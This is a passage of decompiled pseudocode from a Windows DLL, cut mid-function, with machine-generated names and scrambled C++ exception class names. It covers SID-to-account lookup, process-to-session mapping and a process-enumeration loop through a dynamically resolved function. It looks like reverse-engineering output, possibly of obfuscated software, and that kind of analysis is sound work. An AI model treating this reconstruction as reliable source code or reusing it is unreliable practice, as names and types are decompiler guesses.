  if ( v8 >= 4 && sub_1000C77C(v7, 0) == 0xFFFF )
  {
    v2 = (_DWORD *)sub_1000C73C(v8 - 4, v7, (int)v6, 4);
    LOBYTE(v11) = 3;
    v3 = sub_10009DF1(v2, v9);
    LOBYTE(v11) = 4;
    sub_100021B1(v3 + 1, a2 + 1);
    LOBYTE(v11) = 3;
    sub_10009F65(v9);
    LOBYTE(v11) = 1;
    sub_1000C45D(v6);
  }
  else
  {
    v4 = sub_10009F06(v9);
    LOBYTE(v11) = 2;
    sub_100021B1(v4 + 1, a2 + 1);
    LOBYTE(v11) = 1;
    sub_10009F65(v9);
  }
  LOBYTE(v11) = 0;
  sub_1000C45D(v7);
  return a2;
}
// 1002FD8F: using guessed type int var_2C[3];
// 1002FD8F: using guessed type int var_40[5];

//----- (1002FE63) --------------------------------------------------------
_DWORD *__thiscall sub_1002FE63(int *this, _DWORD *a2, char a3)
{
  void *v4; // eax
  int v5; // eax
  _DWORD pExceptionObject[2]; // [esp+10h] [ebp-18h] BYREF
  int v8; // [esp+18h] [ebp-10h]
  int v9; // [esp+24h] [ebp-4h]

  v9 = 0;
  v8 = 0;
  v4 = (void *)(*(int (__thiscall **)(int *))(*this + 64))(this);
  if ( (unsigned int)v4 > 0x8000000 )
  {
    sub_1000E01D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  sub_1000C28D(v4, (int)a2, 0);
  v9 = 0;
  v8 = 1;
  sub_1000C81E(a2);
  v5 = *this;
  if ( a3 )
    (*(void (__thiscall **)(int *, _DWORD *))(v5 + 20))(this, a2);
  else
    (*(void (__thiscall **)(int *, _DWORD *))(v5 + 12))(this, a2);
  return a2;
}
// 1002FE63: using guessed type _DWORD pExceptionObject[2];

//----- (1002FED5) --------------------------------------------------------
void __thiscall sub_1002FED5(void *this, int a2, unsigned int a3)
{
  unsigned int i; // esi
  _DWORD pExceptionObject[2]; // [esp+8h] [ebp-8h] BYREF

  for ( i = 0; i < a3; ++i )
  {
    if ( !(*(int (__thiscall **)(void *, unsigned int))(*(_DWORD *)this + 16))(this, i + a2) )
    {
      sub_1000EA5A(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__);
    }
  }
}
// 1002FED5: using guessed type _DWORD pExceptionObject[2];

//----- (1002FF1A) --------------------------------------------------------
char sub_1002FF1A()
{
  return 1;
}

//----- (1002FF1D) --------------------------------------------------------
int __usercall sub_1002FF1D@<eax>(int a1@<eax>, int a2@<esi>)
{
  *(_DWORD *)(a2 + 4) = 0;
  *(_DWORD *)a2 = off_10074CC8;
  *(_BYTE *)(a2 + 8) = 1;
  sub_100300EB(a1, a2);
  return a2;
}
// 10074CC8: using guessed type int (__thiscall *off_10074CC8[2])(void *Block, char);

//----- (1002FF35) --------------------------------------------------------
HLOCAL *__thiscall sub_1002FF35(HLOCAL *Block, char a2)
{
  sub_1002FF72(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002FF62) --------------------------------------------------------
HLOCAL *__usercall sub_1002FF62@<eax>(HLOCAL *result@<eax>)
{
  if ( *((_BYTE *)result + 8) )
    return (HLOCAL *)LocalFree(result[1]);
  return result;
}

//----- (1002FF72) --------------------------------------------------------
HLOCAL *__thiscall sub_1002FF72(HLOCAL *this)
{
  *this = off_10074CC8;
  return sub_1002FF62(this);
}
// 10074CC8: using guessed type int (__thiscall *off_10074CC8[2])(void *Block, char);

//----- (1002FFA3) --------------------------------------------------------
_DWORD *__stdcall sub_1002FFA3(int a1, _DWORD *a2)
{
  WCHAR *v2; // edi
  wchar_t *v3; // eax
  _DWORD *v4; // eax
  void *v6; // [esp-18h] [ebp-68h]
  int pExceptionObject; // [esp+10h] [ebp-40h] BYREF
  int v8[2]; // [esp+14h] [ebp-3Ch] BYREF
  int v9[2]; // [esp+1Ch] [ebp-34h] BYREF
  int v10[2]; // [esp+24h] [ebp-2Ch] BYREF
  int v11[2]; // [esp+2Ch] [ebp-24h] BYREF
  int v12; // [esp+34h] [ebp-1Ch]
  enum _SID_NAME_USE peUse; // [esp+38h] [ebp-18h] BYREF
  DWORD cchName; // [esp+3Ch] [ebp-14h] BYREF
  DWORD cchReferencedDomainName[3]; // [esp+40h] [ebp-10h] BYREF
  int v16; // [esp+4Ch] [ebp-4h]

  v12 = 0;
  v6 = *(void **)(a1 + 4);
  cchName = 0;
  cchReferencedDomainName[0] = 0;
  peUse = SidTypeInvalid;
  if ( LookupAccountSidW(0, v6, 0, &cchName, 0, cchReferencedDomainName, &peUse) || GetLastError() != 122 )
  {
    sub_1000E2E3(&pExceptionObject, 1);
    goto LABEL_3;
  }
  sub_10009D9C(cchName, v10);
  v16 = 1;
  sub_10009D9C(cchReferencedDomainName[0], v11);
  LOBYTE(v16) = 2;
  sub_1000A02D(v11);
  v2 = *(WCHAR **)(v11[1] + 12);
  sub_1000A02D(v10);
  if ( !LookupAccountSidW(0, *(PSID *)(a1 + 4), *(LPWSTR *)(v10[1] + 12), &cchName, v2, cchReferencedDomainName, &peUse) )
  {
    sub_1000E2E3(&pExceptionObject, 1);
LABEL_3:
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1000A223((int)v10);
  sub_1000A223((int)v11);
  v3 = (wchar_t *)sub_1000BE16((int)&unk_1008E2B0);
  sub_10009D2C(v9, v3);
  LOBYTE(v16) = 3;
  v4 = sub_1000A132(v8, (int)v11, (int)v9);
  LOBYTE(v16) = 4;
  sub_1000A132(a2, (int)v4, (int)v10);
  v12 = 1;
  LOBYTE(v16) = 3;
  sub_10009F65(v8);
  LOBYTE(v16) = 2;
  sub_10009F65(v9);
  LOBYTE(v16) = 1;
  sub_10009F65(v11);
  LOBYTE(v16) = 0;
  sub_10009F65(v10);
  return a2;
}

//----- (100300EB) --------------------------------------------------------
BOOL __usercall sub_100300EB@<eax>(int a1@<eax>, int a2@<ecx>)
{
  BOOL result; // eax
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  result = ConvertStringSidToSidW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12), (PSID *)(a2 + 4));
  if ( !result )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 100300EB: using guessed type _DWORD pExceptionObject[3];

//----- (1003011F) --------------------------------------------------------
int __stdcall sub_1003011F(int a1, DWORD pSessionId)
{
  DWORD v2; // eax
  DWORD v3; // eax
  DWORD v4; // eax
  _ThrowInfo *v5; // ecx
  int *v6; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-4Ch]
  int v9[7]; // [esp+14h] [ebp-34h] BYREF
  int v10[5]; // [esp+30h] [ebp-18h] BYREF
  int v11; // [esp+44h] [ebp-4h]

  v2 = pSessionId;
  *(_DWORD *)a1 = &off_10074B6C;
  *(_DWORD *)(a1 + 4) = v2;
  v11 = 0;
  *(_DWORD *)a1 = &off_10074CCC;
  sub_1001EB43((_DWORD *)(a1 + 8), 0, 0);
  sub_10033FA7(a1 + 20);
  sub_10033975(a1 + 48);
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_10025D50(a1 + 76, (void *)0xFFFFFFFF, 0, 0, v3, CurrentProcessId);
  *(_BYTE *)(a1 + 88) = 0;
  sub_10030B00((_DWORD *)(a1 + 92));
  LOBYTE(v11) = 5;
  v4 = *(_DWORD *)(a1 + 4);
  if ( !v4 || v4 == -1 )
  {
    sub_10002D88(&pSessionId);
    _CxxThrowException(&pSessionId, (_ThrowInfo *)&_TI2_AVMxpteqpIoxoylsrdYuvyamxpt_sr__);
  }
  if ( !ProcessIdToSessionId(v4, &pSessionId) )
    sub_100283EC();
  sub_1001EE3A(v10, (int)&unk_10095620, 0, 1, 0x40u);
  LOBYTE(v11) = 6;
  sub_100126AF();
  LOBYTE(v11) = 5;
  sub_10009696(v10);
  sub_100303E0(v5);
  v6 = sub_10033EBD(v9);
  LOBYTE(v11) = 7;
  sub_1003028D(v6, a1 + 20);
  LOBYTE(v11) = 5;
  sub_1003026D(v9);
  sub_100303FA(a1);
  v11 = -1;
  return a1;
}
// 100301F9: variable 'v5' is possibly undefined
// 100126AF: using guessed type int sub_100126AF(void);
// 100283EC: using guessed type void __noreturn sub_100283EC(void);
// 10074B6C: using guessed type void (__noreturn *off_10074B6C)();
// 10074CCC: using guessed type int (__thiscall *off_10074CCC)(void *Block, char);
// 1003011F: using guessed type int var_18[5];
// 1003011F: using guessed type int var_34[7];

//----- (1003024E) --------------------------------------------------------
int *__thiscall sub_1003024E(int *Block, char a2)
{
  sub_10030379(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003026D) --------------------------------------------------------
LONG __stdcall sub_1003026D(int *a1)
{
  return sub_1000C45D(a1);
}

//----- (1003028D) --------------------------------------------------------
int __usercall sub_1003028D@<eax>(int *a1@<eax>, int a2@<ecx>)
{
  sub_1000C439(a1, a2);
  *(_DWORD *)(a2 + 20) = a1[5];
  *(_DWORD *)(a2 + 24) = a1[6];
  return a2;
}

//----- (100302A9) --------------------------------------------------------
int __thiscall sub_100302A9(_DWORD *this, int a2)
{
  int v3; // eax
  DWORD v4; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-20h]

  v3 = this[1];
  *(_DWORD *)a2 = &off_10074B6C;
  *(_DWORD *)(a2 + 4) = v3;
  *(_DWORD *)a2 = &off_10074CCC;
  sub_100114E7((int)(this + 2), (_DWORD *)(a2 + 8));
  sub_10030344(this + 5, a2 + 20);
  sub_10033975(a2 + 48);
  CurrentProcessId = GetCurrentProcessId();
  v4 = GetCurrentProcessId();
  sub_10025D50(a2 + 76, (void *)0xFFFFFFFF, 0, 0, v4, CurrentProcessId);
  *(_DWORD *)(a2 + 84) = 0;
  *(_BYTE *)(a2 + 88) = 0;
  sub_10030B00((_DWORD *)(a2 + 92));
  sub_100303FA(a2);
  return a2;
}
// 10074B6C: using guessed type void (__noreturn *off_10074B6C)();
// 10074CCC: using guessed type int (__thiscall *off_10074CCC)(void *Block, char);

//----- (10030344) --------------------------------------------------------
int __thiscall sub_10030344(_DWORD *this, int a2)
{
  sub_1000C3F3(this, a2);
  *(_DWORD *)(a2 + 20) = this[5];
  *(_DWORD *)(a2 + 24) = this[6];
  return a2;
}

//----- (10030379) --------------------------------------------------------
void __thiscall sub_10030379(int *this)
{
  *this = (int)&off_10074CCC;
  sub_10030B2C(this + 23);
  sub_1000F1E1(this + 19);
  this[12] = (int)&off_10074E30;
  sub_1003026D(this + 5);
  sub_10009696(this + 2);
  *this = (int)&off_10074B6C;
}
// 10074B6C: using guessed type void (__noreturn *off_10074B6C)();
// 10074CCC: using guessed type int (__thiscall *off_10074CCC)(void *Block, char);
// 10074E30: using guessed type int (__thiscall *off_10074E30)(void *Block, char);

//----- (100303E0) --------------------------------------------------------
void __thiscall sub_100303E0(_ThrowInfo *this)
{
  if ( !byte_1008E11A )
    byte_1008E11A = sub_10033D0E(this);
}
// 1008E11A: using guessed type char byte_1008E11A;

//----- (100303F6) --------------------------------------------------------
char __thiscall sub_100303F6(_BYTE *this)
{
  return this[88];
}

//----- (100303FA) --------------------------------------------------------
unsigned int __thiscall sub_100303FA(int this)
{
  void *v2; // ecx
  int v3; // ecx
  unsigned int result; // eax
  DWORD v5; // eax
  int v6; // eax
  int v7; // ebx
  int v8; // esi
  DWORD v9; // eax
  int v10; // eax
  void *v11; // eax
  int v12; // eax
  int v13; // edi
  int v14; // eax
  int v15; // [esp-10h] [ebp-80h] BYREF
  char *v16; // [esp-Ch] [ebp-7Ch]
  void *v17; // [esp-8h] [ebp-78h] BYREF
  DWORD CurrentProcessId; // [esp-4h] [ebp-74h]
  int v19; // [esp+0h] [ebp-70h]
  char *v20; // [esp+4h] [ebp-6Ch]
  DWORD v21; // [esp+8h] [ebp-68h]
  void **v22; // [esp+Ch] [ebp-64h]
  int (__thiscall **v23)(void *, char); // [esp+10h] [ebp-60h] BYREF
  char v24[8]; // [esp+2Ch] [ebp-44h] BYREF
  int v25; // [esp+34h] [ebp-3Ch]
  void *v26; // [esp+38h] [ebp-38h]
  void *pExceptionObject[3]; // [esp+48h] [ebp-28h] BYREF
  void *v28; // [esp+54h] [ebp-1Ch] BYREF
  void *v29[5]; // [esp+58h] [ebp-18h] BYREF
  int v30; // [esp+6Ch] [ebp-4h]

  pExceptionObject[2] = (void *)this;
  if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)this + 8))(this) )
    sub_10030615(v2);
  if ( (dword_10095798 & 1) == 0 )
  {
    dword_10095798 |= 1u;
    v30 = 0;
    CurrentProcessId = (DWORD)v2;
    v17 = v2;
    v28 = &v17;
    sub_10009F32(&v17, (int)&unk_10095638);
    LOBYTE(v30) = 1;
    v16 = (char *)v3;
    v15 = v3;
    v29[0] = &v15;
    sub_10009F32(&v15, (int)&unk_10095630);
    LOBYTE(v30) = 0;
    dword_10092410 = (int (__stdcall *)(_DWORD))sub_100265E5(v15, (int)v16, (int)v17);
    v30 = -1;
  }
  while ( 1 )
  {
    result = *(_DWORD *)(this + 40);
    if ( result <= *(_DWORD *)(this + 44) )
      break;
    CurrentProcessId = GetCurrentProcessId();
    v5 = GetCurrentProcessId();
    sub_10014EC9((HANDLE *)(this + 76), (HANDLE)0xFFFFFFFF, 0, 0, v5, CurrentProcessId);
    *(_DWORD *)(this + 84) = 0;
    v6 = sub_10034019((_DWORD *)(this + 20), (int)&v23);
    v30 = 3;
    v7 = this + 48;
    (*(void (__thiscall **)(int, int))(*(_DWORD *)(this + 48) + 4))(this + 48, v6);
    v30 = -1;
    v23 = &off_10074E30;
    v8 = sub_10013422((_DWORD *)(this + 8));
    if ( (*(int (__thiscall **)(int))(*(_DWORD *)(this + 48) + 8))(this + 48) == v8
      && (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v7 + 32))(this + 48) == byte_1008E11A )
    {
      v30 = 4;
      v9 = GetCurrentProcessId();
      v10 = (*(int (__thiscall **)(int, DWORD))(*(_DWORD *)v7 + 8))(this + 48, v9);
      v11 = (void *)(*(int (__thiscall **)(int, int, _DWORD, int))(*(_DWORD *)v7 + 12))(this + 48, 1, 0, v10);
      sub_10014EC9((HANDLE *)(this + 76), v11, v19, (BOOL)v20, v21, (DWORD)v22);
      v30 = -1;
      v29[0] = (void *)28;
      v12 = *(_DWORD *)(this + 80);
      v22 = v29;
      v21 = 28;
      v20 = v24;
      v19 = 0;
      if ( dword_10092410(v12) < 0 )
      {
        v13 = *(_DWORD *)(this + 80);
        CurrentProcessId = (DWORD)v29;
        v17 = v29[0];
        v16 = v24;
        v15 = 0;
        v14 = dword_10092410(v13);
        sub_1002CAFE(pExceptionObject, v14);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__);
      }
      if ( v25 == *(_DWORD *)(this + 4) )
      {
        v28 = v26;
        if ( !(*(unsigned __int8 (__thiscall **)(int, void **))(*(_DWORD *)(this + 92) + 4))(this + 92, &v28) )
        {
          *(_DWORD *)(this + 84) = v26;
          result = (*(int (__thiscall **)(int, int))(*(_DWORD *)(this + 92) + 8))(this + 92, this + 84);
          *(_BYTE *)(this + 88) = 0;
          return result;
        }
      }
    }
  }
  *(_BYTE *)(this + 88) = 1;
  return result;
}
// 10030414: variable 'v2' is possibly undefined
// 10030443: variable 'v3' is possibly undefined
// 10074E30: using guessed type int (__thiscall *off_10074E30)(void *Block, char);
// 1008E11A: using guessed type char byte_1008E11A;
// 10092410: using guessed type int (__stdcall *dword_10092410)(_DWORD);
// 10095798: using guessed type int dword_10095798;

//----- (100305BB) --------------------------------------------------------
int __thiscall sub_100305BB(_DWORD *this)
{
  void *v2; // ecx

  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 8))(this) )
    sub_10030615(v2);
  return this[21];
}
// 100305C7: variable 'v2' is possibly undefined

//----- (100305D1) --------------------------------------------------------
_DWORD *__thiscall sub_100305D1(void **this, _DWORD *a2)
{
  void *v3; // ecx

  if ( (*((unsigned __int8 (__thiscall **)(void **))*this + 2))(this) )
    sub_10030615(v3);
  sub_1000F2B5(a2, this[20], 1);
  return a2;
}
// 100305EC: variable 'v3' is possibly undefined

//----- (10030615) --------------------------------------------------------
void __thiscall __noreturn sub_10030615(void *this)
{
  void *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  sub_1000E15A(&pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
}

//----- (10030631) --------------------------------------------------------
void __thiscall sub_10030631(_DWORD *this)
{
  *this = &off_10074D04;
  *this = off_10072944;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10074D04: using guessed type int (__thiscall *off_10074D04)(void *Block, char);

//----- (10030656) --------------------------------------------------------
BOOL __thiscall sub_10030656(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10030668) --------------------------------------------------------
int __thiscall sub_10030668(int this, int a2)
{
  sub_1003075A((void *)(this + 4), a2);
  return a2;
}

//----- (10030699) --------------------------------------------------------
int __thiscall sub_10030699(int this, int a2)
{
  sub_10007898((void *)(this + 20), a2);
  return a2;
}

//----- (100306CA) --------------------------------------------------------
_DWORD *__thiscall sub_100306CA(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x18u);
  if ( v3 )
    v4 = sub_10030788(this, v3);
  else
    v4 = 0;
  sub_10030C15(a2, (int)v4);
  return a2;
}

//----- (1003071B) --------------------------------------------------------
_DWORD *__thiscall sub_1003071B(_DWORD *Block, char a2)
{
  sub_10030631(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003073A) --------------------------------------------------------
_DWORD *__thiscall sub_1003073A(_DWORD *Block, char a2)
{
  *Block = &off_10074D34;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10074D34: using guessed type int (__thiscall *off_10074D34)(void *Block, char);

//----- (1003075A) --------------------------------------------------------
int __thiscall sub_1003075A(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (10030788) --------------------------------------------------------
_DWORD *__thiscall sub_10030788(void *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10074D34;
  a2[1] = this;
  *a2 = &off_10074D8C;
  a2[2] = off_10074D30;
  a2[5] = 0;
  return result;
}
// 10074D30: using guessed type int (__thiscall *off_10074D30[2])(void *Block, char);
// 10074D34: using guessed type int (__thiscall *off_10074D34)(void *Block, char);
// 10074D8C: using guessed type int (__thiscall *off_10074D8C)(void *Block, char);

//----- (100307C5) --------------------------------------------------------
BOOL __thiscall sub_100307C5(int this)
{
  return *(_DWORD *)(this + 20) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (100307D8) --------------------------------------------------------
BOOL __thiscall sub_100307D8(_DWORD *this)
{
  return this[5] != 0;
}

//----- (100307E2) --------------------------------------------------------
int __thiscall sub_100307E2(int this)
{
  _DWORD *v2; // eax
  int v4; // [esp-4h] [ebp-8h]

  v2 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
                   *(_DWORD *)(this + 4) + 4,
                   *(_DWORD *)(this + 20));
  v4 = *(_DWORD *)(this + 20);
  *(_DWORD *)(this + 12) = *v2;
  *(_BYTE *)(this + 16) = *(_BYTE *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(*(_DWORD *)(this + 4) + 20) + 44))(
                                      *(_DWORD *)(this + 4) + 20,
                                      v4);
  return this + 8;
}

//----- (10030810) --------------------------------------------------------
void __thiscall sub_10030810(_DWORD *this)
{
  ++this[5];
}

//----- (10030814) --------------------------------------------------------
void __thiscall sub_10030814(_DWORD *this)
{
  --this[5];
}

//----- (10030818) --------------------------------------------------------
void __noreturn sub_10030818()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000E1AC(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 10030818: using guessed type void __noreturn sub_10030818();
// 10030818: using guessed type _DWORD pExceptionObject[2];

//----- (10030835) --------------------------------------------------------
void __noreturn sub_10030835()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000E1AC(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 10030835: using guessed type void __noreturn sub_10030835();
// 10030835: using guessed type _DWORD pExceptionObject[2];

//----- (10030859) --------------------------------------------------------
_DWORD *__thiscall sub_10030859(_DWORD *Block, char a2)
{
  sub_10030899(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10030879) --------------------------------------------------------
_DWORD *__thiscall sub_10030879(_DWORD *Block, char a2)
{
  *Block = off_10074D30;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10074D30: using guessed type int (__thiscall *off_10074D30[2])(void *Block, char);

//----- (10030899) --------------------------------------------------------
_DWORD *__stdcall sub_10030899(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  a1[2] = off_10074D30;
  *a1 = &off_10074D34;
  return result;
}
// 10074D30: using guessed type int (__thiscall *off_10074D30[2])(void *Block, char);
// 10074D34: using guessed type int (__thiscall *off_10074D34)(void *Block, char);

//----- (100308E6) --------------------------------------------------------
void __thiscall sub_100308E6(_DWORD *this)
{
  *this = &off_10074D54;
  sub_10007EEF((int)(this + 5));
  sub_10011668((int)(this + 1));
  sub_10030631(this);
}
// 10074D54: using guessed type int (__thiscall *off_10074D54)(void *Block, char);

//----- (10030931) --------------------------------------------------------
bool __thiscall sub_10030931(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_10030D00(this, a2);
  return v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
      && *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3) == *a2;
}

//----- (1003096B) --------------------------------------------------------
char __thiscall sub_1003096B(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_10030D00(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    return 0;
  }
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (100309BA) --------------------------------------------------------
int __thiscall sub_100309BA(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // edi
  int v4; // esi
  int v5; // eax

  v2 = a2;
  v4 = sub_10030D00(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v4) != *v2 )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, v2, v4);
    v5 = this[5];
    HIBYTE(a2) = 0;
    (*(void (__thiscall **)(_DWORD *, char *, int))(v5 + 32))(this + 5, (char *)&a2 + 3, v4);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v4);
}

//----- (10030A12) --------------------------------------------------------
int __thiscall sub_10030A12(_DWORD *this, _DWORD *pExceptionObject)
{
  _DWORD *v2; // esi
  int v4; // edi

  v2 = pExceptionObject;
  v4 = sub_10030D00(this, pExceptionObject);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v4) != *v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v4);
}

//----- (10030A67) --------------------------------------------------------
_DWORD *__thiscall sub_10030A67(_DWORD *this, _DWORD *a2)
{
  sub_10016D87(this + 1, a2);
  return a2;
}

//----- (10030A98) --------------------------------------------------------
_DWORD *__thiscall sub_10030A98(_DWORD *this, _DWORD *a2)
{
  sub_100087D2(this + 5, a2);
  return a2;
}

//----- (10030AC9) --------------------------------------------------------
int __thiscall sub_10030AC9(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 60))(this + 1, a2);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 60))(this + 5);
}

//----- (10030AE4) --------------------------------------------------------
int __thiscall sub_10030AE4(_DWORD *this)
{
  (*(void (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 52))(this + 5);
}

//----- (10030AF8) --------------------------------------------------------
int __thiscall sub_10030AF8(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 64))(this + 1);
}

//----- (10030B00) --------------------------------------------------------
_DWORD *__stdcall sub_10030B00(_DWORD *a1)
{
  *a1 = &off_10074CE0;
  sub_10030CBD(a1 + 1);
  return a1;
}
// 10074CE0: using guessed type int (__thiscall *off_10074CE0)(void *Block, char);

//----- (10030B2C) --------------------------------------------------------
void __thiscall sub_10030B2C(_DWORD *this)
{
  *this = &off_10074CE0;
  sub_100308E6(this + 1);
}
// 10074CE0: using guessed type int (__thiscall *off_10074CE0)(void *Block, char);

//----- (10030B53) --------------------------------------------------------
int __thiscall sub_10030B53(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 8))(this + 1);
}

//----- (10030B5F) --------------------------------------------------------
BOOL __thiscall sub_10030B5F(_DWORD *this, int a2)
{
  char v3; // bl

  v3 = (*(int (__thiscall **)(_DWORD *, int))(*this + 4))(this, a2);
  *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 16))(this + 1, a2) = 1;
  return v3 == 0;
}

//----- (10030B8B) --------------------------------------------------------
int __thiscall sub_10030B8B(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 12))(this + 1);
}

//----- (10030B97) --------------------------------------------------------
int __thiscall sub_10030B97(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, a2);
  return a2;
}

//----- (10030BC8) --------------------------------------------------------
int __thiscall sub_10030BC8(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 32))(this + 1, a2);
  return a2;
}

//----- (10030BF9) --------------------------------------------------------
int __thiscall sub_10030BF9(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
}

//----- (10030C05) --------------------------------------------------------
int __thiscall sub_10030C05(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 24))(this + 1);
}

//----- (10030C0D) --------------------------------------------------------
int __thiscall sub_10030C0D(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 28))(this + 1);
}

//----- (10030C15) --------------------------------------------------------
_DWORD *__userpurge sub_10030C15@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10030C54) --------------------------------------------------------
void __thiscall sub_10030C54(void *this)
{
  sub_10030D81((int)this);
}

//----- (10030C7F) --------------------------------------------------------
_DWORD *__thiscall sub_10030C7F(_DWORD *Block, char a2)
{
  sub_100308E6(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10030C9E) --------------------------------------------------------
_DWORD *__thiscall sub_10030C9E(_DWORD *Block, char a2)
{
  sub_10030B2C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10030CBD) --------------------------------------------------------
_DWORD *__stdcall sub_10030CBD(_DWORD *a1)
{
  sub_10030DA9(a1);
  *a1 = &off_10074D54;
  sub_10030DD4(a1 + 1);
  sub_100089F2(a1 + 5);
  return a1;
}
// 10074D54: using guessed type int (__thiscall *off_10074D54)(void *Block, char);

//----- (10030D00) --------------------------------------------------------
int __userpurge sub_10030D00@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  int v2; // esi
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  v6 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v5 || *a2 == *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
        break;
      if ( *a2 >= *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
      {
        v6 = v2;
